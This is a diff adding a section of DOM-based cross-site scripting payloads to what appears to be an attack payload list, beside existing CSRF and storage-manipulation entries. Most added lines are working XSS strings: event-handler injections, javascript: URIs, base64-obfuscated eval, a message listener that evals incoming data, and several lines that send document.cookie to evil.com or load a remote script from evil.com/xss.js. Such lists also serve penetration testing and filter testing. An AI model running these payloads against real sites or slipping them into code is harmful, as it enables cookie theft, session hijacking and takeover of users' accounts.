@@ -333,6 +333,66 @@ document.body.appendChild(form);
 form.submit();
 </script>
 
+
+# Advanced DOM-based XSS Payloads (2025 Edition)
+# location/location.href based
+javascript:alert(1)
+javascript:fetch('//evil.com?cookie='+document.cookie)
+javascript:eval(atob('YWxlcnQoMSk='))
+
+# document.write based
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>document.write('<svg onload=alert(1)>')</script>
+<script>document.write('<iframe src=javascript:alert(1)>')</script>
+<script>document.write(atob('PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='))</script>
+
+# innerHTML/outerHTML/insertAdjacentHTML
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<script>alert(1)</script>
+
+# eval/setTimeout/setInterval/Function
+alert(1)
+fetch('//evil.com?cookie='+document.cookie)
+(function(){var x=document.createElement('script');x.src='//evil.com/xss.js';document.head.appendChild(x)})()
+
+# Function constructor
+alert(1)
+fetch('//evil.com?cookie='+document.cookie)
+
+# URL fragment based (for location.hash sinks)
+#<img src=x onerror=alert(1)>
+#<svg onload=alert(1)>
+#<iframe src=javascript:alert(1)>
+#<script>alert(1)</script>
+
+# insertAdjacentHTML
+<img src=x onerror=alert(document.domain)>
+
+# Web Messaging
+window.addEventListener('message',function(e){eval(e.data)});
+
+# Clipboard API
+navigator.clipboard.writeText('javascript:alert(1)').then(() => navigator.clipboard.readText().then(eval));
+
+# WebRTC
+const pc = new RTCPeerConnection();pc.createDataChannel('storage').send(JSON.stringify({xss:1}));
+
+# MutationObserver
+new MutationObserver(()=>alert(1)).observe(document,{childList:true,subtree:true});
+
+# IntersectionObserver
+new IntersectionObserver(()=>alert(1)).observe(document.body);
+
+# BroadcastChannel
+new BroadcastChannel('xss').postMessage('<img src=x onerror=alert(1)>');
+
+# Polyglot
+<svg><g/onload=alert(1)//<p>
+
+# More advanced payloads in custom_payloads/dom-xss.txt
+
 # Storage Manipulation Payloads
 <script>
 // Overwriting storage data
